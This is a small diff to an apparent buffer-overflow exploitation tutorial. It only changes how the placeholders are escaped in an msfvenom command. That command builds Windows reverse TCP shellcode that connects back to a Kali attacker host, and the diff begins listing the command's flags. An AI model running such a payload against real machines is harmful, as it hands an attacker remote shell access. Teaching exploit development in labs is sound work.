@@ -314,7 +314,7 @@ hit play and go back to Kali and run overflow.py, when you come back to Immunity
 ## Generating the Shell Code:
 
 #### Kali Linux:
-msfvenom -p windows/shell_reverse_tcp LHOST=<Kali IP> LPORT=<Kali Port#> EXITFUNC=thread -f c -a x86 -b “\x00”
+msfvenom -p windows/shell_reverse_tcp LHOST=\<Kali-IP\> LPORT=\<Kali-Port#\> EXITFUNC=thread -f c -a x86 -b “\x00”
 1. -p: payload; create a windows reverse shell
 2. LHOST=<Kali IP>; Listening Host
 3. LPORT=<Kali Port#>; 
